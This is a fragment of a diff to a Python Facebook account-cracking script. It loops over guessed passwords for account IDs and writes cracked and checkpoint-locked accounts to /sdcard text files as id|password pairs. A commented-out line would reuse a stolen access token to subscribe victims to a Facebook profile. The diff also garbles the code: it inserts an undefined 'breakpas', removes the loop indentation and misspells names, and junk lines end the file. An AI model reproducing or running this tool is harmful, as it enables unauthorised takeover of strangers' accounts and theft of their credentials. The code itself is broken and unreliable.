@@ -824,21 +824,23 @@ def M_file_4(ids, names, passlist):
 				#token = po['access_token']
 				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
 				oks.append(ids)
-				break
-			elif 'www.facebook.com' in po['error']['message']:
-				    if 'y' in pcp:
-					        print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-					        open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					        cps.append(ids)
-					        break
-				            
-			else:
-				continue
-		loop+=1
+				breakpas
+elif 'www.facebook.com' in po['error']['message']:
+    if 'y' in pcp:
+        print('\r\x1b[38;5;246m[DJAJIL_MK-CP] : ' + ids + ' | ' + pas + '\x1b[0m')
+        open('/sdcard/DIALIL_MK_CP.txt', 'a').write(ids+' | '+pas+'\n')
+        cps.append(ids)
+        break
+
+else:
+    continue
+
+loop += 1
+
 except requests.exceptions.ConnectionError:
     time.sleep(20)
+
 except Exception as e:
-    #print(e)
     pass
 
 print("TRY METHOD 1 & 4 FOR BEST RESULTS")
@@ -1065,6 +1067,7 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
+
 
 
 
